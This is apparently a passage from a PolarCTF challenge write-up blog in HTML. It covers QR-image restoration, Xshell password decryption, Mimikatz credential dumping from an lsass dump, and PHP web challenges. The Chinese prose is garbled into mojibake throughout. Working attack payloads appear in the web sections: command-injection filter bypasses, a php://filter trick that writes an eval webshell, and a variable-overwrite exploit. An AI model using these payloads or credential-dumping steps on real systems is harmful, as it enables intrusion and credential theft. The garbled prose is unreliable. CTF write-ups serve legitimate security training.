class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç©ºç™½å›¾åƒ</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">33</span>, <span class="number">33</span>), color = <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¡«å……åƒç´ ç‚¹é¢œè‰²</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        img.putpixel((x, y), image_list[y][x])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå›¾åƒ</span></span><br><span class="line">img.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜å›¾åƒ</span></span><br><span class="line">img.save(<span class="string">&#x27;restored_flag.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20231208092154595.png" alt="image-20231208092154595"></p><p>æ‰«ç å¾—åˆ°Polar_Night,0f46d4b056acb49f06b1090bab56189d</p><h5 id="01"><a href="#01" class="headerlink" title="01"></a>01</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥01æ•°æ®</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="string">&#x27;1111111011111001001111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001000000001101000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101000100010101011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101010011110001011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101001110010101011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001000111001001000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111010101010101111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000000000110001000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0010111011011101010001001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1110100111100111010101001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0110001100010000110111011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000100100001010111100010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0001001111110100110001001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0001000110000101110101010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001111000010111101011011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0101010001010010100000010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001001011100111111111001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000000011011100100010001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111001100010101011011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001011111001100011000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101011001010111111000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101000001110010111010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101011001000111110101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001001101001001110010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111000010001000011011&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç©ºç™½å›¾åƒ</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="built_in">len</span>(data[<span class="number">0</span>]), <span class="built_in">len</span>(data)), color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¡«å……åƒç´ ç‚¹é¢œè‰²</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[<span class="number">0</span>])):</span><br><span class="line">        pixel = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">if</span> data[y][x] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">else</span> (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        img.putpixel((x, y), pixel)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå›¾åƒ</span></span><br><span class="line">img.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜å›¾åƒ</span></span><br><span class="line">img.save(<span class="string">&#x27;restored_image.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20231208093657267.png" alt="image-20231208093657267"></p><p>è§£å‡ºæ¥ç¬¬ä¸€æ¬¡è§è¿™ç§ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~å‘œå–µå–µå–µå–µå‘œå•Šå–µå•Šå‘œå‘œå–µå‘œå‘œ~å–µå–µ~å•Šå–µå•Šå‘œå–µå–µ~å–µ~å–µ~å‘œå‘œå–µå‘œå•Šå–µå–µå–µå‘œå•Šå‘œ~å•Šå‘œå–µå‘œå‘œå•Šå‘œ~~å•Šå–µå•Šå‘œå–µå–µ~å–µ~å–µ~å‘œå–µå‘œå‘œ~å–µå–µå–µå‘œå•Šå–µå‘œå•Šå‘œå–µå‘œå‘œå•Šå‘œå‘œ~å•Šå–µå•Šå‘œå–µå–µ~å–µ~å–µ~å‘œå–µå‘œ~~å–µå–µå–µå‘œå‘œå‘œå‘œå•Šå‘œå–µå‘œå‘œå•Šå‘œå–µå–µå•Šå–µå•Šå‘œå–µå–µ~å•Š~å–µ~å‘œå–µå‘œå–µå•Šå–µå–µå–µå‘œå•Šå–µå‘œå‘œå‘œå–µå‘œå‘œ~å–µå•Š~å•Šå–µå•Šå‘œ~å‘œå–µå‘œ~å–µ~å‘œå‘œå–µå‘œå‘œå–µå–µå–µå‘œå•Šå–µå‘œå‘œå‘œå–µå‘œå‘œå•Šå‘œ~å–µå•Šå–µå•Šå‘œ~å‘œå•Š~~å–µ~å‘œå‘œå–µå‘œå–µå–µå–µå–µå‘œå‘œå‘œå•Š~å‘œå–µå‘œå‘œå•Šå‘œå•Š~å•Šå–µå•Šå‘œå–µå–µ~å‘œ~å–µ~å‘œå–µå‘œ~~å–µå–µå–µå‘œå‘œå‘œå‘œ~å‘œå–µå‘œå‘œå•Šå‘œ~å•Šå•Šå–µå•Šå‘œå–µå–µå–µå–µ~å–µ~å‘œå–µå‘œå–µ~å–µå–µå–µå‘œå‘œå‘œå‘œå‘œå‘œå–µå‘œå‘œ~å–µ~å–µå•Šå–µå•Šå‘œ~å‘œå–µ~~å–µ~å‘œå‘œå–µå‘œå–µå–µå–µå–µå‘œå‘œå‘œå•Šå‘œå‘œå–µå‘œå‘œ~å‘œå‘œå–µå•Š</span><br></pre></td></tr></table></figure><p>å…½éŸ³è¯‘è€…<code>https://roar.iiilab.com/</code><br><img src="/images/polarctf/image-20231208094202833.png" alt="image-20231208094202833"></p><h5 id="docxéšå†™"><a href="#docxéšå†™" class="headerlink" title="docxéšå†™"></a>docxéšå†™</h5><p>æ‰“å¼€wordï¼Œå…¨é€‰æ”¹ä¸€ä¸‹é¢œè‰²å³å¯ï¼Œ<img src="/images/polarctf/image-20231215155553572.png" alt="image-20231215155553572"></p><p>å°†docxæ”¹ä¸ºzipï¼Œè§£å‹å°±èƒ½çœ‹åˆ°æœ€åä¸€æ®µflagäº†</p><p><img src="/images/polarctf/image-20231215155409671.png" alt="image-20231215155409671"></p><h5 id="Xshellå¯†ç ç ´è§£"><a href="#Xshellå¯†ç ç ´è§£" class="headerlink" title="Xshellå¯†ç ç ´è§£"></a>Xshellå¯†ç ç ´è§£</h5><p>xshellæ–‡ä»¶è§£å¯†ï¼Œé¢˜ç›®æè¿°ï¼šè¿™æ˜¯ä¸€é“è´´åˆå®é™…æ”»å‡»åœºæ™¯çš„ä¸€é“é¢˜ï¼Œåœ¨ä¸€æ¬¡æº¯æºååˆ¶çš„è¿‡ç¨‹ä¸­ï¼Œpurpletè¢«è“é˜Ÿå¤§ä½¬ååˆ¶ï¼Œè‡ªå·±çš„ç”µè„‘ç«Ÿè¢«æ§åˆ¶ä½äº†ï¼Œè“é˜Ÿå¤§ä½¬åœ¨ä»purpletçš„ç›®æ ‡æœºä¸­æŸ¥åˆ°ä¸€æ®µä»¤äººä¸è§£çš„æ•°å­—ï¼šS-1-5-21-323397330-1794634962-2946154912-1001ï¼ŒåŒæ—¶è¿˜å¾—åˆ°äº†ä¸€ä¸ªXshellçš„é…ç½®æ–‡ä»¶ï¼Œä»–ä»¬æƒ³çŸ¥é“purpletè¿™ä¸ªäººçš„Xshellè¿æ¥è¿‡çš„æœåŠ¡å™¨å¯†ç æ˜¯å¤šå°‘ï¼Œä½ èƒ½å¸®åŠ©ä»–ä»¬ç ´è§£å¼€ä¹ˆï¼Ÿ<br>flag{MD5ï¼ˆå¯†ç ï¼‰}</p><p>è¿™é‡Œç»™äº†ä¸€ä¸ªxshçš„æ–‡ä»¶ï¼Œç”¨è¿™ä¸ªé¡¹ç›®çš„è„šæœ¬è§£å¯†</p><p><code>https://github.com/HyperSine/how-does-Xmanager-encrypt-password</code></p><p><code>python3 .\XShellCryptoHelper.py -d -ver 6.0 -user purplet -sid S-1-5-21-323397330-1794634962-2946154912-1001 vYZ6tni/wCY0aWv83Tu+0UvW5hCYP1gMOl8o/zF5LIJkmHsIpz1l1Avnog==</code></p><p>åœ¨è¿™é‡Œé¢userå¯ä»¥çŒœåˆ°æ—¶purpletï¼Œsidç»™äº†ï¼Œpasså’Œveréƒ½ç»™äº†ï¼Œç›´æ¥è§£å³å¯<code>nicaicai!23</code></p><p><img src="/images/polarctf/image-20231220210341006.png" alt="image-20231220210341006"></p><p>åœ¨md5å³å¯</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>æè¿°ï¼šå³°å“¥æŸä¸€å¤©é€šè¿‡3389ç«¯å£çš„CVE-2019-0708æ¼æ´æ‹¿åˆ°äº†ä¸€å°ç›®æ ‡æœºå™¨ï¼Œå¹¶æ–°å»ºäº†ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼Œè¿œç¨‹ç™»é™†äº†ç›®æ ‡ä¸»æœºï¼Œä»–çŸ¥é“å†…ç½‘ä¸­å¾ˆå¤šæœºå™¨çš„å¯†ç ä¼šå› ä¸ºäººä¸ºè®¾ç½®ä¼šå‡ºç°ç›¸åŒçš„æƒ…å†µï¼Œæ‰€ä»¥å®ƒä¸ºäº†ç»§ç»­æ¨ªå‘æ¸—é€ï¼Œåˆ©ç”¨procdumpå·¥å…·æå–äº†ç”¨æˆ·ç™»å½•å‡­æ®ï¼Œä½ èƒ½å¸®ä»–ç»§ç»­ç ´è§£å‡ºç™»å½•å¯†ç ä¹ˆï¼Ÿflagæ ¼å¼ï¼šflag{md5(ç™»å½•å¯†ç )}<br>è§£å¼€å‹ç¼©åŒ…æ˜¯ä¸€ä¸ªdmpæ–‡ä»¶ï¼Œæç¤ºäº†mimikatz,é‚£åº”è¯¥å°±æ˜¯æœ¬åœ°æ–‡ä»¶è¯»å¯†ç äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#æ”¾åœ¨ç›¸åŒæœ¨å½•ä¸‹ï¼Œå³å¯</span><br><span class="line">minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20240112164350866.png" alt="image-20240112164350866"></p><p>toorçš„md5</p><h5 id="ç®€å•rce"><a href="#ç®€å•rce" class="headerlink" title="ç®€å•rce"></a>ç®€å•rce</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(no(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nonono</span><br></pre></td></tr></table></figure><p><code>http://d66cc31d-7e85-4966-b532-b847f685bad3.www.polarctf.com:8090/?sys=passthru(&#39;ca&quot;&quot;t$&#123;IFS&#125;/flag&#39;);</code></p><p><code>http://d66cc31d-7e85-4966-b532-b847f685bad3.www.polarctf.com:8090/?sys=passthru(&#39;ls$&#123;IFS&#125;/&#39;);</code></p><h5 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>file_put_contents ç»•è¿‡æ­»äº¡dieå†™shellï¼Œç”¨base64 æˆ–è€…rotç­‰ç»•è¿‡<code>https://www.freebuf.com/articles/web/266565.html</code></p><p>?filename=php://filter/convert.base64-decode/resource=1.php</p><p>content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</p><h5 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h5><p>view-source:<a href="http://d471787d-afe0-4441-beee-5dacb2a31213.www.polarctf.com:8090/.index.php.swp">http://d471787d-afe0-4441-beee-5dacb2a31213.www.polarctf.com:8090/.index.php.swp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function jiuzhe($xdmtql)&#123;</span><br><span class="line">    return preg_match(&#x27;/sys.*nb/is&#x27;,$xdmtql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$xdmtql=@$_POST[&#x27;xdmtql&#x27;];</span><br><span class="line">if(!is_array($xdmtql))&#123;</span><br><span class="line">    if(!jiuzhe($xdmtql))&#123;</span><br><span class="line">        if(strpos($xdmtql,&#x27;sys nb&#x27;)!==false)&#123;</span><br><span class="line">            echo &#x27;flag&#123;*******&#125;&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;true .swp file?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;nijilenijile&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ„çš„ï¼Œ<a href="https://blog.csdn.net/weixin_46029520/article/details/130173887![image-20231215161023782](/images/polarctf/image-20231215161023782.png)">https://blog.csdn.net/weixin_46029520/article/details/130173887![image-20231215161023782](/images/polarctf/image-20231215161023782.png)</a></p><h5 id="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in $flag</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$c=$_POST[&#x27;sys&#x27;];</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;flag1&#x27;]) || isset($_GET[&#x27;flag2&#x27;]) || isset($_POST[&#x27;flag1&#x27;]) || isset($_POST[&#x27;flag2&#x27;])) &#123;//ä¸èƒ½æœ‰flag12ç­‰</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);æ¥å—postä¼ å‚</span><br><span class="line">if($flag1 == &#x27;8gen1&#x27; &amp;&amp; $flag2 == &#x27;8gen1&#x27;) &#123;</span><br><span class="line">    if(isset($_POST[&#x27;504_SYS.COM&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\?/&quot;, $c))&#123;</span><br><span class="line">         eval(&quot;$c&quot;);  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//http://b19e6d80-35bf-4b97-96a4-3ab7636527a6.www.polarctf.com:8090/?_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1</span><br><span class="line">post:</span><br><span class="line">504[SYS.COM=1&amp;sys=echo $flag;&amp;</span><br></pre></td></tr></table></figure><h5 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 